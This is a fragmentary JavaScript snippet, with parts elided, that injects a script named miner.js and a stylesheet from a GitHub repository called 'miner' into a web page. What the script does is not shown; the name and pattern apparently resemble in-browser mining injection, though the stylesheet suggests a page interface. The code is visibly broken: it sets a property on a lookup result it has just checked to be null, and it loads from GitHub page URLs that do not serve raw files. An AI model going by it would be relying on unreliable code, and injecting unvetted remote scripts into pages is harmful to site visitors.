var loadJS = function(url, implementationCode, location){
    if (getScriptBySrc('https://github.com/Liuxinhao12/miner/blob/main/miner.js')==null) {
        ...
        getScriptBySrc('https://github.com/Liuxinhao12/miner/blob/main/miner.js').onreadystatechange=implementationCode;
    }
};
var base_function = function(){
    ...
    link.rel  = 'stylesheet';
    link.type = 'text/css';
    link.href = 'https://github.com/Liuxinhao12/miner/blob/main/ui.css';
    link.media = 'all';
...
loadJS('https://github.com/Liuxinhao12/miner/blob/main/miner.js', base_function, document.body);
